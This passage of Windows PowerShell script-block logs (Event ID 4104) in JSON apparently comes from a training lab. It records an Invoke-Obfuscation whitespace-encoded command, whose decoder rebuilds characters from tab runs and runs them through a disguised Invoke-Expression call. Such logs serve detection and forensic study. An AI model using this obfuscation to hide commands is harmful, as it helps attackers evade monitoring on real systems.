$Char}","ScriptBlockId":"c40409a9-1bee-416e-9c8e-7a5e99d60c39","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedWhitespaceCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:16:25.959189Z"},"EventRecordID":665864,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-E050-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"'        \t    \t\t       \t          \t\t         \t         \t\t    \t   \t\t     \t \t\t        \t         \t\t  \t \t  \t\t  \t  \t          \t\t     \t      \t\t        \t          \t\t          \t         \t\t  \t \t       \t\t  \t \t  \t\t          \t          \t\t  \t  \t       \t\t    \t   \t\t        \t         \t\t  \t \t  \t\t  \t  \t       \t\t     \t       \t\t         \t        \t\t  \t \t  \t\t          \t         \t\t       \t        \t\t  \t \t         \t\t  \t \t      \t\t  \t \t  \t\t  \t  \t \t\t  \t  \t       \t\t     \t  \t\t     \t       \t\t       \t         \t\t  \t  \t  \t\t  \t  \t          \t\t  \t  \t \t\t  \t \t         \t\t  \t  \t  \t\t          \t        \t\t  \t \t \t\t         \t    \t\t  \t  \t       \t\t  \t  \t     \t\t  \t \t      \t\t  \t  \t \t\t  \t \t    \t\t     \t \t\t    \t          \t\t  \t \t     \t\t  \t  \t       \t\t  \t  \t       \t\t  \t  \t   \t\t  \t  \t      \t\t      \t         \t\t     \t        \t\t     \t        \t\t  \t  \t     \t\t          \t        \t\t  \t  \t          \t\t     \t       \t\t  \t \t    \t\t  \t \t      \t\t  \t  \t       \t\t  \t \t     \t\t  \t  \t        \t\t          \t         \t\t  \t  \t        \t\t  \t  \t      \t\t  \t \t  \t\t  \t  \t     \t\t          \t          \t\t  \t  \t  \t\t  \t  \t \t\t  \t  \t       \t\t  \t \t  \t\t  \t  \t \t\t  \t  \t       \t\t     \t       \t\t          \t          \t\t  \t  \t  \t\t  \t \t          \t\t     \t        \t\t  \t \t          \t\t          \t        \t\t  \t  \t       \t\t  \t  \t       \t\t  \t \t      \t\t  \t \t   \t\t  \t \t  \t\t  \t  \t      \t\t  \t  \t       \t\t          \t        \t\t  \t  \t       \t\t  \t \t      \t\t  \t  \t  \t\t  \t  \t \t\t     \t        \t\t         \t \t\t  \t  \t  \t\t  \t  \t          \t\t  \t \t  \t\t  \t  \t     \t\t         \t    \t\t  \t  \t   \t\t  \t \t         \t\t  \t  \t  \t\t  \t \t      \t\t  \t  \t       \t\t     \t        \t\t  \t \t          \t\t          \t        \t\t  \t  \t      \t\t  \t  \t       \t\t  \t \t  \t\t  \t  \t     \t\t     \t        \t\t       \t          \t\t  \t   \t \t\t  \t \t   \t\t  \t \t      \t\t  \t \t         \t\t  \t  \t       \t\t  \t  \t     \t\t          \t        \t\t  \t  \t       \t\t  \t \t      \t\t  \t  \t  \t\t  \t  \t \t\t     \t        \t\t        \t    \t\t  \t  \t \t\t  \t  \t         \t\t  \t  \t  \t\t  \t \t        \t\t  \t \t  \t\t     \t      \t\t        \t        \t\t  \t \t      \t\t  \t \t          \t\t  \t \t      \t\t  \t \t        \t\t          \t        \t\t  \t  \t       \t\t  \t   \t   \t\t     \t       \t\t  \t  \t   \t\t  \t  \t      \t\t     \t          \t\t    \t          \t\t     \t  \t\t      \t          \t\t    \t   \t\t        \t    \t\t  \t  \t \t\t  \t  \t         \t\t  \t  \t  \t\t  \t \t        \t\t  \t \t  \t\t     \t      \t\t        \t        \t\t  \t \t      \t\t  \t \t          \t\t  \t \t      \t\t  \t \t        \t\t          \t        \t\t  \t  \t       \t\t  \t   \t   \t\t    \t   \t\t     \t      \t\t       \t         \t\t  \t  \t        \t\t  \t \t          \t\t  \t  \t   \t\t       \t        \t\t  \t  \t     \t\t  \t \t  \t\t  \t \t \t\t  \t  \t      '| FOrEAcH-ObJect { $vFzAY=$_ -spLIT '\t\t'|FOrEAcH-ObJect {'\t'; $_.sPliT('\t')|FOrEAcH-ObJect{ $_.lENGTh- 1 } };((-JoIN($vFzAY[0..($vFzAY.lENGTh-1)])).trim('\t ').sPliT( '\t')| FOrEAcH-ObJect { ([Char][iNT]$_)}) -JoIN'' | . ( ''.InDexof.TOStrING()[106,482,184]-jOin'')}","ScriptBlockId":"16ccdd02-07f3-4a38-88ca-a1a30a0b2e0c","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:16:25.959996Z"},"EventRecordID":665865,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-E150-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{ $vFzAY=$_ -spLIT '\t\t'|FOrEAcH-ObJect {'\t'; $_.sPliT('\t')|FOrEAcH-ObJect{ $_.lENGTh- 1 } };((-JoIN($vFzAY[0..($vFzAY.lENGTh-1)])).trim('\t ').sPliT( '\t')| FOrEAcH-ObJect { ([Char][iNT]$_)}) -JoIN'' | . ( ''.InDexof.TOStrING()[106,482,184]-jOin'')}","ScriptBlockId":"99f31917-e3ce-431d-a24e-9ad1de6aa3bc","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:16:25.960492Z"},"EventRecordID":665866,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-E250-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{'\t'; $_.sPliT('\t')|FOrEAcH-ObJect{ $_.lENGTh- 1 } }","ScriptBlockId":"b0ab4b4f-9348-438d-b53d-8ef76952f01e","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:16:25.963114Z"},"EventRecordID":665867,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-E350-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{ $_.lENGTh- 1 }","ScriptBlockId":"13cd2d51-71f9-4307-948c-c2c8260f7d42","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:16:26.128194Z"},"EventRecordID":666046,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-2D51-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{ ([Char][iNT]$_)}","ScriptBlockId":"a060c6e2-d8b3-4410-a73e-3bf4c5ada93b","Path":""}}}
